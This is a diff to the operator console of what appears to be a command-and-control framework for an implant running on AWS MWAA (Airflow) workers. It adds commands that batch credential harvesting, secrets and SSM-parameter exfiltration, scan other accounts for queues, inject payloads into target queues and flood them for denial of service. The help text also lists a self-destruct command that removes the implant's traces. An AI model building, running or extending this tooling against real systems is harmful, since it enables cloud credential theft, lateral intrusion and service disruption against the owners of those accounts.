@@ -252,6 +252,14 @@ def operator_console(
         print("    !network-recon        - Network interfaces, routes, VPCs, subnets, SGs, IMDS")
         print("    !self-destruct        - Remove the implant DAG and cached .pyc files")
         print()
+        print("  Data Collection:")
+        print("    !exfil                - Run all data collection modules at once")
+        print()
+        print("  Remote Attack Operations:")
+        print("    !recon <acct1,acct2,...>        - Scan accounts for MWAA queues from implant")
+        print("    !inject <acct> <queue> <name>   - Inject payload into target queue")
+        print("    !dos-flood <acct> <queue> [n]   - Flood target queue with messages")
+        print()
         print("  File Operations:")
         print("    !read-file <path>     - Read a file from the worker filesystem")
         print("    !write-file <p> <b64> - Write base64 content to a file on the worker")
@@ -312,6 +320,102 @@ def operator_console(
                     _display_result(r)
                 total += len(results)
             print_info(f"Drained {total} result(s).")
+            continue
+
+        # !exfil shortcut: batch all data collection modules
+        if user_input == "!exfil":
+            batch_cmds = [
+                "!harvest-creds",
+                "!airflow-dump",
+                "!s3-recon",
+                "!secrets",
+                "!ssm-params",
+            ]
+            actual_command = "!multi\n" + "\n".join(batch_cmds)
+            print_info(f"Sending batch exfil ({len(batch_cmds)} modules)...")
+            msg_id = send_command(attacker, actual_command, cmd_queue)
+            print_success(f"Exfil batch queued (MessageId: {msg_id})")
+            print_info("Waiting for results...")
+            time.sleep(3)
+            results = receive_results(attacker, results_queue, wait_seconds=20)
+            if results:
+                for r in results:
+                    _display_result(r)
+            else:
+                print_info("No results yet. Try '!results' later.")
+            continue
+
+        # !recon - validate input then send to implant
+        if user_input.startswith("!recon "):
+            args = user_input[len("!recon "):].strip()
+            if not args:
+                print_info("Usage: !recon <account_id1,account_id2,...>")
+                continue
+            # Validate: should be comma-separated numbers
+            accounts = [a.strip() for a in args.split(",") if a.strip()]
+            if not accounts:
+                print_info("Usage: !recon <account_id1,account_id2,...>")
+                continue
+            print_info(f"Sending recon scan for {len(accounts)} account(s)...")
+            msg_id = send_command(attacker, user_input, cmd_queue)
+            print_success(f"Recon command queued (MessageId: {msg_id})")
+            print_info("Waiting for results...")
+            time.sleep(2)
+            results = receive_results(attacker, results_queue, wait_seconds=15)
+            if results:
+                for r in results:
+                    _display_result(r)
+            else:
+                print_info("No results yet. The implant may not have polled. Try '!results' later.")
+            continue
+
+        # !inject - resolve named payloads to JSON then send to implant
+        if user_input.startswith("!inject "):
+            from .event_injection import INJECTION_PAYLOADS
+            parts = user_input[len("!inject "):].strip().split(None, 2)
+            if len(parts) < 3:
+                print_info("Usage: !inject <account_id> <queue_name> <payload_name_or_json>")
+                print_info(f"Available payloads: {', '.join(INJECTION_PAYLOADS.keys())}")
+                continue
+            acct, queue, payload_arg = parts
+            # Resolve named payload to JSON
+            if payload_arg in INJECTION_PAYLOADS:
+                import json as _json
+                resolved = _json.dumps(INJECTION_PAYLOADS[payload_arg]["payload"])
+                print_info(f"Resolved payload '{payload_arg}' to JSON")
+            else:
+                resolved = payload_arg
+            actual_command = f"!inject {acct} {queue} {resolved}"
+            print_info(f"Sending inject command to implant...")
+            msg_id = send_command(attacker, actual_command, cmd_queue)
+            print_success(f"Inject command queued (MessageId: {msg_id})")
+            print_info("Waiting for results...")
+            time.sleep(2)
+            results = receive_results(attacker, results_queue, wait_seconds=15)
+            if results:
+                for r in results:
+                    _display_result(r)
+            else:
+                print_info("No results yet. Try '!results' later.")
+            continue
+
+        # !dos-flood - validate input then send to implant
+        if user_input.startswith("!dos-flood "):
+            parts = user_input[len("!dos-flood "):].strip().split()
+            if len(parts) < 2:
+                print_info("Usage: !dos-flood <account_id> <queue_name> [count]")
+                continue
+            print_info(f"Sending dos-flood command to implant...")
+            msg_id = send_command(attacker, user_input, cmd_queue)
+            print_success(f"DoS flood command queued (MessageId: {msg_id})")
+            print_info("Waiting for results...")
+            time.sleep(2)
+            results = receive_results(attacker, results_queue, wait_seconds=15)
+            if results:
+                for r in results:
+                    _display_result(r)
+            else:
+                print_info("No results yet. Try '!results' later.")
             continue
 
         # Multi-command mode: collect lines until empty line
